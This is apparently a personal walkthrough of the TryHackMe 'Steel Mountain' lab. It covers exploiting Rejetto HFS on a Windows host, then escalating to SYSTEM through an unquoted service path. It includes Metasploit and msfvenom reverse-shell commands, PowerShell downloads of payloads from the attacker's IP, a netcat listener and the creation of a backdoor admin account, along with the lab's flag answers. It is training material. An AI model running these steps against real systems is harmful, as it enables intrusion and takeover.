Task 1  Introduction
---------------------

In this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.

Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

1. Who is the employee of the month?

picture Present in the port 80 webserver (hosted)

--> Bill Harper


Task 2  Initial Access
-----------------------

Scan the machine with nmap. What is the other port running a web server on?

```
PORT      STATE SERVICE            REASON  VERSION
80/tcp    open  http               syn-ack Microsoft IIS httpd 8.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server? syn-ack
| ssl-cert: Subject: commonName=steelmountain
| Issuer: commonName=steelmountain
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2021-07-08T20:51:28
| Not valid after:  2022-01-07T20:51:28
| MD5:   8709 a020 40c7 71ec 1907 0372 5df5 4657
| SHA-1: 3b81 38bf 7186 0a82 371c 3c1d 443a 9380 bb95 dc5e
| -----BEGIN CERTIFICATE-----
| MIIC3jCCAcagAwIBAgIQITncN5pTTpdHnXhGU++U6jANBgkqhkiG9w0BAQUFADAY
| MRYwFAYDVQQDEw1zdGVlbG1vdW50YWluMB4XDTIxMDcwODIwNTEyOFoXDTIyMDEw
| NzIwNTEyOFowGDEWMBQGA1UEAxMNc3RlZWxtb3VudGFpbjCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBALzk2LgS0GGlrXEskHH8pi0br2id1tecmaIZi93t
| O1lIGrM3iY+P1DUn7xNavZhf+Sn3AP/ON3b7KXPXk8IhWN4gEOdS4BMTrp1X8f/D
| XK2LmDBkbmQkt6MJxEYSut3mfFeLoXR86cofkJSjUzb65VFv79Jhx9LUVvkwRw7t
| uAKaFEzzWmw91TiEDveFyt7XzVUj3wh5QBtzhBhhNEXiMRDRZFYTycxUO8tVCsZ7
| +PYtFuXGqZN8+5564GOk3AusIa7BiCBnmL64gunwyJSowh/FmFBfSAdsYBR/2U7H
| GVLGfYSRboHogwSPkaxcM6BEBV0U2A2Brm72paCgNTT2rNsCAwEAAaMkMCIwEwYD
| VR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBBQUAA4IB
| AQBZv4CI0Lo9rbjCpY97G3yi5h9eNyxpzgNhpcJlGUC1s5EqfxaTun/dMSA4wkHK
| AZPEJz2mqHS1FWijz0mhMPZoQtWmqiEKsheThAeeijt+zWFiiGBR/kh350qE953n
| UhBiyzIn5fnLIH/IdXkDX88dW59YLvcSh/T/I9I/SSEvHKVnxoK/cwK9jp67jMHx
| yJqYpnouqgRn9/6vCcdPJfyeAtUBPBBESn4zbZuqTmwEPGhKEQcCQ9k4WvCDioCI
| DIr/ee8g3iEXy0aegLrDpEFaQObbNzqGu/7HxUmzhE2EUCkab2APP5YsPUzL+afl
| LMp6NHY3HrfSLMx5V18P/bkh
|_-----END CERTIFICATE-----
|_ssl-date: 2021-07-09T21:01:01+00:00; -1s from scanner time.
8080/tcp  open  http               syn-ack HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
|_http-title: HFS /
49152/tcp open  msrpc              syn-ack Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack Microsoft Windows RPC
49155/tcp open  msrpc              syn-ack Microsoft Windows RPC
49156/tcp open  msrpc              syn-ack Microsoft Windows RPC
49163/tcp open  msrpc              syn-ack Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:28:8b:ec:85:33 (unknown)
| Names:
|   STEELMOUNTAIN<20>    Flags: <unique><active>
|   STEELMOUNTAIN<00>    Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
| Statistics:
|   02 28 8b ec 85 33 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 35667/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 24587/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 17430/udp): CLEAN (Failed to receive data)
|   Check 4 (port 39146/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-09T21:00:55
|_  start_date: 2021-07-09T20:51:22

```
--> 8080

2. Take a look at the other web server. What file server is running?

--> rejetto http file server

3. What is the CVE number to exploit this file server?

rejetto http file server: version 2.3

Used `searchsploit`

--> 2014-6287

4. Use Metasploit to get an initial shell. What is the user flag?

```
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS <ip>
set RPORT 8080
exploit
```
Port = 8080 as webserver rejetto was running on port 8080

```
SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
SRVPORT    8080             yes       The local port to listen on.
```

> This exploit has three options: SRVHOST, SRVPORT, and URIPATH.

> 1. The _SRVHOST_ optionrefers to the IP address of your current computer (i.e. the one you are using to execute thea ttack) --> Actually for building the **C2 server**

> 2. The _SRVPORT_ option refers to the port you will use for the exploitation.

- In this case: srv port 8080 => i.e. we will create a C2 channel via port 8080 On which webserver is running.

see this:

![](pic1.jpeg?raw=true)

#### Up in this image, we can see the **meterpreter shell** was able to connect to victim ip on `port: 49401` which we havn't mentioned, done by metasploit it self, but why port **4901** ??


#### If in this case `SRVHOST` is made equal to `0.0.0.0` then we don't have to worry about that much as `0.0.0.0` means any address, but that doesn't mean victim address ( that would be absurd). Here any address means any address in the LAN network of the attacker. This the reason why _metasploit_ makes `0.0.0.0` as default value of `SRVHOST`

--> b04763b6fcf51fcd7c13abc7db4fd365


Task3: Privilege Escalation
------------------------------

Now that you have an initial shell on this Windows machine as Bill, we can further enumerate the machine and escalate our privileges to root!

To enumerate this machine, we will use a powershell script called **PowerUp**.
_"PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations._"

#### Upload it via: `upload` command in meterpreter shell

To execute this using Meterpreter:
```
meterpreter > load powershell
meterpreter > powershell_shell

PS > . .\PowerUp.ps1
PS > Invoke-AllChecks
``` 

#### NOTE:
Running Invoke-AllChecks will output any identifiable vulnerabilities along with specifications for any abuse functions.



Here, We will Priv Esc Windows by taking advantage of _Unquoted Service Path vulnerability_

see: [Windows Privilege Escalation â€” Part 1 (Unquoted Service Path)](https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae)


Small portion of the result produced by the _PowerUp.ps1_ script
```diff
+ ServiceName                     : AdvancedSystemCareService9
+ Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
  ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
  ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
  ModifiableFileIdentityReference : STEELMOUNTAIN\bill
  StartName                       : LocalSystem
  AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
+ CanRestart                      : True
  Name                            : AdvancedSystemCareService9
  Check                           : Modifiable Service Files
```

1. Take close attention to the CanRestart option that is set to true. What is the name of the name of the service which shows up as an unquoted service path vulnerability?

--> AdvancedSystemCareService9

We can see from the _`PowerUp.log`_ file present in this directory that `C:\Program Files (x86)\IObit\Advanced SystemCare` is the dreictory which have _"space"_ in between the directory **path** => we can **abuse** this area like putting a **malicious file** in that space just like this:


From here:
```
C:\Program Files (x86)\IObit\Advanced SystemCare
```
To:
```
C:\Program Files (x86)\IObit\Advanced
```
i.e. we have to make an executable file named _Advanced_ so that we can execute this file to gain shell.


BTW, I logged the result inthis way (meterpreter powershell):
```
PS > Invoke-AllChecks > PowerUp.log
```

But there is one catch, we have to see whether we can **restart** that service on that particular path or not.

We found that `C:\Program Files (x86)\IObit\Advanced SystemCare` is the only path in which service can be restarted.
```
CanRestart                      : True
```

That means we can start with this.


we just have to make a payload:
```
$ msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=1234 -e x86/shikata_ga_nai -f exe -o Advanced.exe
```

Then uploading it with the help of previous meterpreter session.


Now we only have to _listen_ on port **1234** with `exploit/multi/handler`


Now comes the replacing part:
```
PS > copy-item Advanced.exe -destination "C:\Program Files (x86)\IObit"
```
Now we have to stop and start the service (so that path gets **renewed**)

stop the service:
```
//sc stop <service name>

sc stop AdvancedSystemCareService9
```

start the service again:
```
sc start AdvancedSystemCareService9
```

Now we will get a shell in the listening port on `exploit/multi/handler`


Task 4  Access and Escalation Without Metasploit
-------------------------------------------------

This time let's use this: [EXPLOIT](https://www.exploit-db.com/exploits/39161)

#### Read the exploit file usage instructions

You will need to run the exploit twice. The first time will pull our netcat binary to the system and the second will execute our payload to gain a callback!


Once we get the shell of trgt machine, we now have to send _winPEAS_ to the trgt system for priv esc.

We will use python3 (http.server) web server only to download the _winPEAS_ script
```
powershell -c Invoke-WebRequest "http://10.8.112.253/winPEASx86.exe" -outFile winPEAS.exe
```

Now after running the script, I got this:

![](winPEAS.png?raw=true)

We can see that red two lines...

***But which one should I choose for priv esc ?***

We have to find out which service...

You can see the winPEAS.log file in _`manual/ directory`_

1. What powershell -c command could we run to manually find out the service name?

*Format is "powershell -c "command here"*

--> powershell -c "Get-Service"

```diff
C:\Program Files (x86)\IObit>powershell -c "Get-Service | Where-Object -Property Status -match Running"
powershell -c "Get-Service | Where-Object -Property Status -match Running"

Status   Name               DisplayName                           
------   ----               -----------                           
+ Running  AdvancedSystemC... Advanced SystemCare Service 9         
Running  AmazonSSMAgent     Amazon SSM Agent                      
Running  AppHostSvc         Application Host Helper Service       
Running  AWSLiteAgent       AWS Lite Guest Agent                  
Running  BFE                Base Filtering Engine                 
Running  BrokerInfrastru... Background Tasks Infrastructure Ser...
Running  CertPropSvc        Certificate Propagation               
Running  CryptSvc           Cryptographic Services                
Running  DcomLaunch         DCOM Server Process Launcher          
Running  Dhcp               DHCP Client                           
Running  Dnscache           DNS Client                            
Running  DPS                Diagnostic Policy Service             
Running  DsmSvc             Device Setup Manager                  
Running  Ec2Config          Ec2Config                             
Running  EventLog           Windows Event Log                     
Running  EventSystem        COM+ Event System                     
Running  FontCache          Windows Font Cache Service            
Running  gpsvc              Group Policy Client                   
Running  IKEEXT             IKE and AuthIP IPsec Keying Modules   
Running  iphlpsvc           IP Helper                             
Running  LanmanServer       Server                                
Running  LanmanWorkstation  Workstation                           
Running  LiveUpdateSvc      LiveUpdate                            
Running  lmhosts            TCP/IP NetBIOS Helper                 
Running  LSM                Local Session Manager                 
Running  MpsSvc             Windows Firewall                      
Running  MSDTC              Distributed Transaction Coordinator   
Running  netprofm           Network List Service                  
Running  NlaSvc             Network Location Awareness            
Running  nsi                Network Store Interface Service       
Running  PlugPlay           Plug and Play                         
Running  PolicyAgent        IPsec Policy Agent                    
Running  Power              Power                                 
Running  ProfSvc            User Profile Service                  
Running  RpcEptMapper       RPC Endpoint Mapper                   
Running  RpcSs              Remote Procedure Call (RPC)           
Running  SamSs              Security Accounts Manager             
Running  Schedule           Task Scheduler                        
Running  SENS               System Event Notification Service     
Running  SessionEnv         Remote Desktop Configuration          
Running  ShellHWDetection   Shell Hardware Detection              
Running  Spooler            Print Spooler                         
Running  SystemEventsBroker System Events Broker                  
Running  TermService        Remote Desktop Services               
Running  Themes             Themes                                
Running  TrkWks             Distributed Link Tracking Client      
Running  UALSVC             User Access Logging Service           
Running  UmRdpService       Remote Desktop Services UserMode Po...
Running  VaultSvc           Credential Manager                    
Running  W32Time            Windows Time                          
Running  W3SVC              World Wide Web Publishing Service     
Running  WAS                Windows Process Activation Service    
Running  Wcmsvc             Windows Connection Manager            
Running  WerSvc             Windows Error Reporting Service       
Running  WinHttpAutoProx... WinHTTP Web Proxy Auto-Discovery Se...
Running  Winmgmt            Windows Management Instrumentation    
Running  WinRM              Windows Remote Management (WS-Manag...
```

Up here, we ***CANNOT*** see all Names properly, so use this:
***We can also see that 1st one matches with the result generated by winPEAS.exe which is vulnerable to `PATH` vulnerability***

So, we can grep that out like:
```
C:\Program Files (x86)\IObit> powershell -c "Get-Service | Where-Object -Property Status -match Running | Select-Object -First 1 | Select-Object Status,Name

powershell -c "Get-Service | Where-Object -Property Status -match Running | Select-Object -First 1 | Select-Object Status,Name

                                 Status Name                                   
                                 ------ ----                                   
                                Running AdvancedSystemCareService9
```

----------------
We can also do the same with:
```
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "C:\windows\\" |findstr /i /v """
```

```
C:\Program Files (x86)\IObit> wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "C:\windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "C:\windows\\" |findstr /i /v """
Advanced SystemCare Service 9                           AdvancedSystemCareService9  C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe                    Auto       
AWS Lite Guest Agent                                    AWSLiteAgent                C:\Program Files\Amazon\XenTools\LiteAgent.exe                                     Auto       
IObit Uninstaller Service                               IObitUnSvr                  C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe                       Auto       
LiveUpdate                                              LiveUpdateSvc               C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe                             Auto       
```
I don't really know the inner workings of **WMIC**...

see: [Joe Helly-blog](https://www.cybersecpadawan.com/2020/04/tryhackme-steel-mountain-metasploit-and.html)

In the above 2 cases, we can see which processes are running along with ***there names*** are...

#### But the main thing is ***"Is it a modifiable service by present user ?"***

Let's see:
```
C:\Program Files (x86)\IObit>icacls "Advanced SystemCare" 

icacls "Advanced SystemCare"
Advanced SystemCare STEELMOUNTAIN\bill:(I)(OI)(CI)(RX,W)
                    NT SERVICE\TrustedInstaller:(I)(F)
                    NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                    NT AUTHORITY\SYSTEM:(I)(F)
                    NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                    BUILTIN\Users:(I)(RX)
                    BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                    CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                    APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                    APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files
```
We can see `STEELMOUNTAIN\bill:(I)(OI)(CI)(RX,W)` i.e. **bill** has _RX_: Read,Execute and _W_:Write permission on it.

***Which is a Positive signal!!!***

Now just we have to _send the payload_ and have to put it _in_ `C:\Program Files (x86)\IObit` directory and _restart the service_:

1. We can download the payload on trgt machine by using: `powershell -c Invoke-WebRequest "http://10.8.112.253/Advanced.exe -outFile Advanced.exe"`
2. And put it in path `"C:\Program Files (x86)\IObit"` by using: `powershell -c Copy-Item Advanced.exe -Directory "C:\Program Files (x86)\IObit"`

Or, we can directly go to `C:\Program Files (x86)\IObit` and then download the Advanced.exe file => **`same thing`**: In this case we don't have to copy the file.

Now we have to _start_ and _stop_ the service (as I think we don't have any ***restart*** type command) but before that **Setup a netcat listener**
```
C:\Program Files (x86)\IObit> sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Program Files (x86)\IObit> sc start AdvancedSystemCareService9
sc start AdvancedSystemCareService9

[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```
#### NOTE:
Here, It says, service is not responding => Which ***Totally makes sense!!*** as legit service is not being run by them...

#### Now We got a shell:
```
kali@reveng ~/T/T/_/p/C/0/0/manual (main)> nc -nlvp 6666
listening on [any] 6666 ...
connect to [10.8.112.253] from (UNKNOWN) [10.10.100.216] 49336
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Now lets, make our user and add our user to admin group
```
C:\Windows\system32>net user reveng007 Passw0rd! /add
net user reveng007 Passw0rd! /add
The command completed successfully.


C:\Windows\system32>net localgroup "Administrators" reveng007 /add
net localgroup "Administrators" reveng007 /add
The command completed successfully.


C:\Windows\system32>net localgroup Administrators
net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
reveng007
The command completed successfully.
```

Now lets login via RDP...

Please do see this blog throughly: [Joe Helly](https://www.cybersecpadawan.com/2020/04/tryhackme-steel-mountain-metasploit-and.html)



